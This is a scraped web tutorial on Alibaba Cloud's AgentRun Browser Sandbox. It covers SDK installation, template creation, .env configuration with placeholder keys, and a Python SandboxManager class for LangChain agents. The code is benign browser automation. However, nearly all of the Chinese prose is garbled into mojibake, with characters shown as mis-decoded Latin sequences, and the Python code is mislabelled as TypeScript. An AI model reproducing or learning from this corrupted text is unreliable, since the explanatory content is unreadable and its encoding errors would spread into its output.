                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»28åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ Agentic AI æ—¶ä»£,æ™ºèƒ½ä½“éœ€è¦ä¸çœŸå®ä¸–ç•Œäº¤äº’,è€Œæµè§ˆå™¨æ˜¯è¿æ¥è™šæ‹Ÿä¸–ç•Œä¸ç°å®ä¸–ç•Œçš„é‡è¦æ¡¥æ¢ã€‚AgentRun Browser Sandbox ä¸ºæ™ºèƒ½ä½“æä¾›äº†å®‰å…¨ã€é«˜æ€§èƒ½ã€å…è¿ç»´çš„æµè§ˆå™¨æ‰§è¡Œç¯å¢ƒ,è®© AI Agent çœŸæ­£å…·å¤‡"ä¸Šç½‘"çš„èƒ½åŠ›â€”â€”ä»ç½‘é¡µæŠ“å–ã€ä¿¡æ¯æå–åˆ°è¡¨å•å¡«å†™ã€è‡ªåŠ¨åŒ–æ“ä½œ,ä¸€åˆ‡çš†å¯å®ç°ã€‚</p>
<h2 data-id="heading-1">AgentRun Browser Sandbox ä»‹ç»</h2>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯ Browser Sandbox?</h3>
<p>Browser Sandbox æ˜¯ AgentRun å¹³å°æä¾›çš„äº‘åŸç”Ÿæ— å¤´æµè§ˆå™¨æ²™ç®±æœåŠ¡,åŸºäºé˜¿é‡Œäº‘å‡½æ•°è®¡ç®—ï¼ˆFCï¼‰æ„å»ºã€‚å®ƒä¸ºæ™ºèƒ½ä½“æä¾›äº†ä¸€ä¸ªå®‰å…¨éš”ç¦»çš„æµè§ˆå™¨æ‰§è¡Œç¯å¢ƒ,æ”¯æŒé€šè¿‡æ ‡å‡†çš„ Chrome DevTools Protocol (CDP) è¿œç¨‹æ§åˆ¶æµè§ˆå™¨å®ä¾‹ã€‚</p>
<h3 data-id="heading-3">æ ¸å¿ƒç‰¹æ€§</h3>
<p><strong>æ— å¤´æµè§ˆå™¨èƒ½åŠ›</strong></p>
<ul>
<li>å†…ç½® Chromium/Chrome æµè§ˆå™¨,æ”¯æŒå®Œæ•´çš„ Web æ ‡å‡†</li>
<li>åŸç”Ÿå…¼å®¹ Puppeteerã€Playwright ç­‰ä¸»æµè‡ªåŠ¨åŒ–æ¡†æ¶</li>
<li>æ”¯æŒé€šè¿‡ CDP åè®®è¿›è¡Œç²¾ç»†åŒ–æ§åˆ¶</li>
</ul>
<p><strong>å®æ—¶å¯è§†åŒ–</strong></p>
<ul>
<li>å†…ç½® VNC æœåŠ¡,æ”¯æŒå®æ—¶æŸ¥çœ‹æµè§ˆå™¨ç•Œé¢</li>
<li>æä¾›æ“ä½œå½•åˆ¶åŠŸèƒ½,æ–¹ä¾¿è°ƒè¯•å’Œå›æ”¾</li>
<li>æ”¯æŒé€šè¿‡ noVNC å®¢æˆ·ç«¯åœ¨ç½‘é¡µä¸­ç›´æ¥è§‚çœ‹</li>
</ul>
<p><strong>å®‰å…¨ä¸éš”ç¦»</strong></p>
<ul>
<li>æ¯ä¸ªæ²™ç®±å®ä¾‹è¿è¡Œåœ¨ç‹¬ç«‹çš„å®¹å™¨ç¯å¢ƒä¸­</li>
<li>æ–‡ä»¶ç³»ç»Ÿå’Œè¿›ç¨‹ç©ºé—´å®Œå…¨éš”ç¦»</li>
<li>æ”¯æŒ WSS åŠ å¯†ä¼ è¾“,ç¡®ä¿æ•°æ®å®‰å…¨</li>
</ul>
<p><strong>Serverless æ¶æ„</strong></p>
<ul>
<li>æŒ‰éœ€åˆ›å»º,æŒ‰é‡ä»˜è´¹,æ— éœ€æå‰é¢„ç½®èµ„æº</li>
<li>å¿«é€Ÿå¼¹æ€§ä¼¸ç¼©,æ”¯æŒé«˜å¹¶å‘åœºæ™¯</li>
<li>é›¶è¿ç»´,æ— éœ€ç®¡ç†æœåŠ¡å™¨å’Œæµè§ˆå™¨ä¾èµ–</li>
</ul>
<h3 data-id="heading-4">ä¸»è¦åº”ç”¨åœºæ™¯</h3>
<ul>
<li><strong>AI Agent èµ‹èƒ½</strong>: ä¸ºå¤§æ¨¡å‹æä¾›"çœ¼ç›"å’Œ"æ‰‹",æ‰§è¡Œç½‘é¡µæµè§ˆã€ä¿¡æ¯æå–ã€åœ¨çº¿æ“ä½œç­‰ä»»åŠ¡</li>
<li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong>: åœ¨äº‘ç«¯è¿è¡Œç«¯åˆ°ç«¯ï¼ˆE2Eï¼‰æµ‹è¯•å’Œè§†è§‰å›å½’æµ‹è¯•</li>
<li><strong>æ•°æ®é‡‡é›†</strong>: ç¨³å®šã€é«˜æ•ˆåœ°è¿›è¡Œç½‘é¡µæŠ“å–,åº”å¯¹åŠ¨æ€åŠ è½½å’Œåçˆ¬è™«æŒ‘æˆ˜</li>
<li><strong>å†…å®¹ç”Ÿæˆ</strong>: è‡ªåŠ¨åŒ–ç”Ÿæˆç½‘é¡µæˆªå›¾æˆ– PDF æ–‡æ¡£</li>
</ul>
<h2 data-id="heading-5">ä¸Šæ‰‹ä½¿ç”¨ Agentrun Browser Sandbox</h2>
<h3 data-id="heading-6">AgentRun SDK å¿«é€Ÿä»‹ç»</h3>
<blockquote>
<p>åç»­çš„å†…å®¹å°†åŸºäº Agentrun SDK è¿›è¡Œï¼Œå› æ­¤æˆ‘ä»¬å…ˆå¯¹ SDK è¿›è¡Œç®€è¦ä»‹ç»</p>
</blockquote>
<p>AgentRun SDK æ˜¯ä¸€ä¸ªå¼€æºçš„ Python å·¥å…·åŒ…,æ—¨åœ¨ç®€åŒ–æ™ºèƒ½ä½“ä¸ AgentRun å¹³å°å„ç§æœåŠ¡ï¼ˆåŒ…æ‹¬ Browser Sandboxï¼‰çš„é›†æˆã€‚å®ƒæä¾›äº†ç»Ÿä¸€çš„æ¥å£,è®©æ‚¨å¯ä»¥ç”¨å‡ è¡Œä»£ç å°±å°†æ²™ç®±èƒ½åŠ›é›†æˆåˆ°ç°æœ‰çš„ Agent æ¡†æ¶ä¸­ã€‚SDK çš„æ ¸å¿ƒåŠŸèƒ½å¦‚ä¸‹ï¼š</p>
<p><strong>ç»Ÿä¸€é›†æˆæ¥å£</strong></p>
<ul>
<li>æä¾›å¯¹ LangChainã€AgentScope ç­‰ä¸»æµæ¡†æ¶çš„å¼€ç®±å³ç”¨æ”¯æŒ</li>
<li>ç»Ÿä¸€çš„æ¨¡å‹ä»£ç†æ¥å£,ç®€åŒ–å¤šæ¨¡å‹ç®¡ç†</li>
<li>æ ‡å‡†åŒ–çš„å·¥å…·æ³¨å†Œæœºåˆ¶</li>
</ul>
<p><strong>Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong></p>
<ul>
<li>è‡ªåŠ¨åˆ›å»ºå’Œé”€æ¯æ²™ç®±å®ä¾‹</li>
<li>æ”¯æŒä¼šè¯çº§åˆ«çš„çŠ¶æ€ä¿æŒ</li>
<li>çµæ´»çš„èµ„æºé…ç½®å’Œè¶…æ—¶æ§åˆ¶</li>
</ul>
<h4 data-id="heading-7">å®‰è£… AgentRun SDK</h4>
<pre><code class="hljs language-bash" lang="bash">pip install agentrun-sdk[playwright,server]
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>: ç¡®ä¿æ‚¨çš„ Python ç¯å¢ƒç‰ˆæœ¬åœ¨ 3.10 åŠä»¥ä¸Šã€‚</p>
</blockquote>
<h4 data-id="heading-8">åŸºæœ¬ä½¿ç”¨ç¤ºä¾‹</h4>
<p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ AgentRun SDK åˆ›å»ºå’Œç®¡ç† Browser Sandbox çš„æ ¸å¿ƒä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> agentrun.sandbox <span class="hljs-keyword">import</span> Sandbox, TemplateType
<span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright

<span class="hljs-comment"># åˆ›å»º Browser Sandbox</span>
sandbox = Sandbox.create(
    template_type=TemplateType.BROWSER,
    template_name=<span class="hljs-string">"your-template-name"</span>,
    sandbox_idle_timeout_seconds=<span class="hljs-number">300</span>
)

<span class="hljs-comment"># è·å– CDP URLï¼ˆç”¨äº Playwright è¿æ¥ï¼‰</span>
cdp_url = sandbox.get_cdp_url()

<span class="hljs-comment"># ä½¿ç”¨ Playwright è¿æ¥å¹¶æ“ä½œ</span>
<span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:
    browser = p.chromium.connect_over_cdp(cdp_url)
    page = browser.contexts[<span class="hljs-number">0</span>].pages[<span class="hljs-number">0</span>]
    
    page.goto(<span class="hljs-string">"https://www.example.com"</span>)
    page.screenshot(path=<span class="hljs-string">"screenshot.png"</span>)
    
    browser.close()

<span class="hljs-comment"># é”€æ¯ Sandbox</span>
sandbox.delete()
</code></pre>
<p><strong>å…³é”®æ¦‚å¿µï¼š</strong></p>
<ul>
<li><strong>template_name</strong>: æ§åˆ¶å°åˆ›å»ºçš„æµè§ˆå™¨ç¯å¢ƒæ¨¡æ¿</li>
<li><strong>cdp_url</strong>: ç”¨äº Playwright/Puppeteer è¿æ¥</li>
<li><strong>vnc_url</strong>: ç”¨äºå®æ—¶æŸ¥çœ‹æµè§ˆå™¨ç”»é¢ï¼ˆå¯é€šè¿‡ <code>sandbox.get_cdp_url()</code> è·å–ï¼‰</li>
</ul>
<blockquote>
<p><strong>æ³¨æ„</strong>: ç”±äºæ‰€æœ‰æµè§ˆå™¨æ“ä½œéƒ½åœ¨äº‘ç«¯è¿›è¡Œï¼Œæ‚¨æ— éœ€åœ¨æœ¬åœ°å®‰è£…æµè§ˆå™¨ã€‚Playwright ä»…ç”¨äºé€šè¿‡ CDP åè®®è¿æ¥åˆ°äº‘ç«¯çš„æµè§ˆå™¨å®ä¾‹ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">å¦‚ä½•åˆ›å»º sandbox æ¨¡æ¿</h3>
<p>ä½¿ç”¨ Browser Sandbox éœ€è¦æ–°å»º Sandbox æ¨¡æ¿ï¼Œæ‚¨éœ€è¦è®¿é—®  <a href="https://link.juejin.cn?target=https%3A%2F%2Ffunctionai.console.aliyun.com%2Fcn-hangzhou%2Fagent%2Fruntime%2Fsandbox" target="_blank" title="https://functionai.console.aliyun.com/cn-hangzhou/agent/runtime/sandbox" ref="nofollow noopener noreferrer">Agentrun æ§åˆ¶å°ç½‘ç«™</a>ï¼Œå¹¶æŒ‰ç…§å¦‚ä¸‹æ­¥éª¤åˆ›å»ºæ¨¡æ¿:</p>
<ol>
<li>åœ¨é¡¶éƒ¨èœå•æ é€‰æ‹©â€œè¿è¡Œæ—¶ä¸æ²™ç®±â€ï¼›</li>
<li>åœ¨å·¦ä¾§è¾¹æ é€‰æ‹©â€œSandboxæ²™ç®±â€ï¼›</li>
<li>ç‚¹å‡»å³ä¸Šè§’â€œåˆ›å»ºæ²™ç®±æ¨¡æ¿â€ï¼›</li>
</ol>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974429440-0c1449b8-6b97-42a0-b7c1-ce0b7a9a6dfd.png" alt="" loading="lazy"/></p>
<ol start="4">
<li>é€‰æ‹©â€œæµè§ˆå™¨â€ï¼›
<img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974441761-64413df3-58a5-4404-b1dc-56d294d739eb.png" alt="" loading="lazy"/></li>
<li>åœ¨å¼¹å‡ºçš„æŠ½å±‰å¯¹è¯æ¡†ä¸­å¡«å†™å’Œé€‰æ‹©æ‚¨çš„æ¨¡æ¿çš„è§„æ ¼ã€ç½‘ç»œç­‰é…ç½®ï¼Œå¹¶å¤åˆ¶æ¨¡æ¿åç§°ï¼›</li>
</ol>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/217148/1766974447184-8384c578-4705-4757-9d82-7b785d8038fb.png" alt="" loading="lazy"/>
6. ç‚¹å‡»â€œåˆ›å»ºæµè§ˆå™¨â€ ç­‰å¾…å…¶å°±ç»ªå³å¯ã€‚</p>
<h3 data-id="heading-10">ä»é›¶å¼€å§‹ç”¨ LangChain åˆ›å»º Browser Sandbox æ™ºèƒ½ä½“</h3>
<p>æœ¬æ•™ç¨‹å°†æŒ‡å¯¼æ‚¨ä»é›¶å¼€å§‹åˆ›å»ºä¸€ä¸ªå®Œæ•´çš„ Browser Sandbox æ™ºèƒ½ä½“é¡¹ç›®ã€‚</p>
<h4 data-id="heading-11">åŸºäº LangChain é›†æˆ Browser Sandbox</h4>
<p>æœ¬æ•™ç¨‹å°†è¯¦ç»†è®²è§£å¦‚ä½•ä½¿ç”¨ LangChain åˆ›å»º Browser Sandbox ç›¸å…³çš„ tools å¹¶é›†æˆåˆ° Agent ä¸­ã€‚</p>
<h5 data-id="heading-12">é¡¹ç›®ç»“æ„</h5>
<p>ä¸ºäº†ä¿æŒä»£ç çš„å†…èšæ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œæˆ‘ä»¬å°†ä»£ç æ‹†åˆ†ä¸ºä»¥ä¸‹æ¨¡å—ï¼š</p>
<p><strong>æ¨¡å—èŒè´£åˆ’åˆ†ï¼š</strong></p>
<ul>
<li>sandbox_manager.py: è´Ÿè´£ Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯ï¼Œæä¾›ç»Ÿä¸€çš„æ¥å£</li>
<li>langchain_agent.py: è´Ÿè´£åˆ›å»º LangChain tools å’Œ Agentï¼Œé›†æˆ VNC ä¿¡æ¯</li>
<li>main.py: ä½œä¸ºå…¥å£æ–‡ä»¶ï¼Œæ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ä¸Šè¿°æ¨¡å—</li>
</ul>
<h5 data-id="heading-13">æ­¥éª¤ 1: åˆ›å»ºé¡¹ç›®å¹¶å®‰è£…ä¾èµ–</h5>
<p>é¦–å…ˆåˆ›å»ºé¡¹ç›®ç›®å½•ï¼ˆå¦‚æœè¿˜æ²¡æœ‰ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">mkdir -p langchain-demo
cd langchain-demo
</code></pre>
<p>åˆ›å»º requirements.txt æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"># <span class="hljs-title class_">LangChain</span> æ ¸å¿ƒåº“
langchain&gt;=<span class="hljs-number">0.1</span><span class="hljs-number">.0</span>
langchain-openai&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.5</span>
langchain-community&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.20</span>

# <span class="hljs-title class_">AgentRun</span> <span class="hljs-variable constant_">SDK</span>
agentrun-sdk[playwright,server]&gt;=<span class="hljs-number">0.0</span><span class="hljs-number">.8</span>

# æµè§ˆå™¨è‡ªåŠ¨åŒ–
playwright&gt;=<span class="hljs-number">1.40</span><span class="hljs-number">.0</span>

# ç¯å¢ƒå˜é‡ç®¡ç†
python-dotenv&gt;=<span class="hljs-number">1.0</span><span class="hljs-number">.0</span>
</code></pre>
<p>ç„¶åå®‰è£…ä¾èµ–ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">pip install -r requirements.<span class="hljs-property">txt</span>
</code></pre>
<p>ä¸»è¦ä¾èµ–è¯´æ˜ï¼š</p>
<ul>
<li>langchain å’Œ langchain-openai: LangChain æ ¸å¿ƒåº“</li>
<li>agentrun-sdk[playwright,server]: AgentRun SDKï¼Œç”¨äº Sandbox ç®¡ç†</li>
<li>playwright: æµè§ˆå™¨è‡ªåŠ¨åŒ–åº“ python-dotenv: ç¯å¢ƒå˜é‡ç®¡ç†</li>
</ul>
<h5 data-id="heading-14">æ­¥éª¤ 2: é…ç½®ç¯å¢ƒå˜é‡</h5>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º .env æ–‡ä»¶ï¼Œé…ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"># é˜¿é‡Œäº‘ç™¾ç‚¼å¹³å°çš„ <span class="hljs-variable constant_">API</span> <span class="hljs-title class_">Key</span>ï¼Œç”¨äºè°ƒç”¨å¤§æ¨¡å‹èƒ½åŠ›
# è¯·å‰å¾€ <span class="hljs-attr">https</span>:<span class="hljs-comment">//bailian.console.aliyun.com/?tab=app#/api-key åˆ›å»ºå’ŒæŸ¥çœ‹</span>
<span class="hljs-variable constant_">DASHSCOPE_API_KEY</span>=sk-your-bailian-api-key

# é˜¿é‡Œäº‘è´¦å·çš„è®¿é—®å¯†é’¥ <span class="hljs-variable constant_">ID</span> å’Œè®¿é—®å¯†é’¥ <span class="hljs-title class_">Secret</span>ï¼Œç”¨äº <span class="hljs-title class_">AgentRun</span> <span class="hljs-variable constant_">SDK</span> é‰´æƒ
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCESS_KEY_ID</span>=your-ak
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCESS_KEY_SECRET</span>=your-sk
<span class="hljs-variable constant_">ALIBABA_CLOUD_ACCOUNT_ID</span>=your-main-account-id
<span class="hljs-variable constant_">ALIBABA_CLOUD_REGION</span>=cn-hangzhou

# browser sandbox æ¨¡æ¿çš„åç§°ï¼Œå¯ä»¥åœ¨ <span class="hljs-attr">https</span>:<span class="hljs-comment">//functionai.console.aliyun.com/cn-hangzhou/agent/runtime/sandbox æ§åˆ¶å°åˆ›å»º</span>
<span class="hljs-variable constant_">BROWSER_TEMPLATE_NAME</span>=sandbox-your-template-name

# agentrun çš„æ§åˆ¶é¢å’Œæ•°æ®é¢çš„ <span class="hljs-variable constant_">API</span> ç«¯ç‚¹è¯·æ±‚åœ°å€ï¼Œé»˜è®¤cn-hangzhou
<span class="hljs-variable constant_">AGENTRUN_CONTROL_ENDPOINT</span>=agentrun.<span class="hljs-property">cn</span>-hangzhou.<span class="hljs-property">aliyuncs</span>.<span class="hljs-property">com</span>
<span class="hljs-variable constant_">AGENTRUN_DATA_ENDPOINT</span>=<span class="hljs-attr">https</span>:<span class="hljs-comment">//${your-main-account-id}.agentrun-data.cn-hangzhou.aliyuncs.com</span>
</code></pre>
<h5 data-id="heading-15">æ­¥éª¤ 3: åˆ›å»º Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†æ¨¡å—</h5>
<p>åˆ›å»º sandbox_manager.py æ–‡ä»¶ï¼Œè´Ÿè´£ Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">""</span><span class="hljs-string">"
Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†æ¨¡å—

è´Ÿè´£ AgentRun Browser Sandbox çš„åˆ›å»ºã€ç®¡ç†å’Œé”€æ¯ã€‚
æä¾›ç»Ÿä¸€çš„æ¥å£ä¾› LangChain Agent ä½¿ç”¨ã€‚
"</span><span class="hljs-string">""</span>

<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-title class_">Optional</span>, <span class="hljs-title class_">Dict</span>, <span class="hljs-title class_">Any</span>
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv

# åŠ è½½ç¯å¢ƒå˜é‡
<span class="hljs-title function_">load_dotenv</span>()


<span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxManager</span>:
    <span class="hljs-string">""</span><span class="hljs-string">"Sandbox ç”Ÿå‘½å‘¨æœŸç®¡ç†å™¨"</span><span class="hljs-string">""</span>
    
    def <span class="hljs-title function_">__init__</span>(self):
        self.<span class="hljs-property">_sandbox</span>: <span class="hljs-title class_">Optional</span>[<span class="hljs-title class_">Any</span>] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_sandbox_id</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_cdp_url</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
        self.<span class="hljs-property">_vnc_url</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>
    
    def <span class="hljs-title function_">create</span>(
        self,
        <span class="hljs-attr">template_name</span>: <span class="hljs-title class_">Optional</span>[str] = <span class="hljs-title class_">None</span>,
        <span class="hljs-attr">idle_timeout</span>: int = <span class="hljs-number">3000</span>
    ) -&gt; <span class="hljs-title class_">Dict</span>[str, <span class="hljs-title class_">Any</span>]:
        <span class="hljs-string">""</span><span class="hljs-string">"
        åˆ›å»ºæˆ–è·å–ä¸€ä¸ªæµè§ˆå™¨ sandbox å®ä¾‹
        
        Args:
            template_name: Sandbox æ¨¡æ¿åç§°ï¼Œå¦‚æœä¸º None åˆ™ä»ç¯å¢ƒå˜é‡è¯»å–
            idle_timeout: ç©ºé—²è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ï¼Œé»˜è®¤ 3000 ç§’
        
        Returns:
            dict: åŒ…å« sandbox_id, cdp_url, vnc_url çš„å­—å…¸
        
        Raises:
            RuntimeError: åˆ›å»ºå¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸
        "</span><span class="hljs-string">""</span>
        <span class="hljs-attr">try</span>:
            <span class="hljs-keyword">from</span> agentrun.<span class="hljs-property">sandbox</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">Sandbox</span>, <span class="hljs-title class_">TemplateType</span>
            
            # å¦‚æœå·²æœ‰ sandboxï¼Œç›´æ¥è¿”å›
            <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is not <span class="hljs-title class_">None</span>:
                <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">get_info</span>()
            
            # ä»ç¯å¢ƒå˜é‡è·å–æ¨¡æ¿åç§°
            <span class="hljs-keyword">if</span> template_name is <span class="hljs-title class_">None</span>:
                template_name = os.<span class="hljs-title function_">getenv</span>(
                    <span class="hljs-string">"BROWSER_TEMPLATE_NAME"</span>,
                    <span class="hljs-string">"sandbox-browser-demo"</span>
                )
            
            # åˆ›å»º sandbox
            self.<span class="hljs-property">_sandbox</span> = <span class="hljs-title class_">Sandbox</span>.<span class="hljs-title function_">create</span>(
                template_type=<span class="hljs-title class_">TemplateType</span>.<span class="hljs-property">BROWSER</span>,
                template_name=template_name,
                sandbox_idle_timeout_seconds=idle_timeout
            )
            
            self.<span class="hljs-property">_sandbox_id</span> = self.<span class="hljs-property">_sandbox</span>.<span class="hljs-property">sandbox_id</span>
            self.<span class="hljs-property">_cdp_url</span> = self.<span class="hljs-title function_">_get_cdp_url</span>()
            self.<span class="hljs-property">_vnc_url</span> = self.<span class="hljs-title function_">_get_vnc_url</span>()
            
            <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">get_info</span>()
        
        except <span class="hljs-title class_">ImportError</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            <span class="hljs-title function_">print</span>(e)
            raise <span class="hljs-title class_">RuntimeError</span>(
                <span class="hljs-string">"agentrun-sdk æœªå®‰è£…ï¼Œè¯·è¿è¡Œ: pip install agentrun-sdk[playwright,server]"</span>
            )
        except <span class="hljs-title class_">Exception</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:
            raise <span class="hljs-title class_">RuntimeError</span>(f<span class="hljs-string">"åˆ›å»º Sandbox å¤±è´¥: {str(e)}"</span>)
    
    def <span class="hljs-title function_">get_info</span>(self) -&gt; <span class="hljs-title class_">Dict</span>[str, <span class="hljs-title class_">Any</span>]:
        <span class="hljs-string">""</span><span class="hljs-string">"
        è·å–å½“å‰ sandbox çš„ä¿¡æ¯
        
        Returns:
            dict: åŒ…å« sandbox_id, cdp_url, vnc_url çš„å­—å…¸
        
        Raises:
            RuntimeError: å¦‚æœæ²¡æœ‰æ´»åŠ¨çš„ sandbox
        "</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">if</span> self.<span class="hljs-property">_sandbox</span> is <span class="hljs-title class_">None</span>:
            raise <span class="hljs-title class_">RuntimeError</span>(<span class="hljs-string">"æ²¡æœ‰æ´»åŠ¨çš„ sandboxï¼Œè¯·å…ˆåˆ›å»º"</span>)
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"sandbox_id"</span>: self.<span class="hljs-property">_sandbox_id</span>,
            <span class="hljs-string">"cdp_url"</span>: self.<span class="hljs-property">_cdp_url</span>,
            <span class="hljs-string">"vnc_url"</span>: self.<span class="hljs-property">_vnc_url</span>,
        }
    
    def <span class="hljs-title function_">get_cdp_url</span>(self) -&gt; <span class="hljs-title class_">Optional</span>[str]:
        <span class="hljs-string">""</span><span class="hljs-string">"è·å– CDP URL"</span><span class="hljs-string">""</span>
        <span class="hljs-keyword">return</span> self.<span class="hljs-property">_sandbox</span>.<span class="hljs-title function_">get_cdp_url</span>()
    
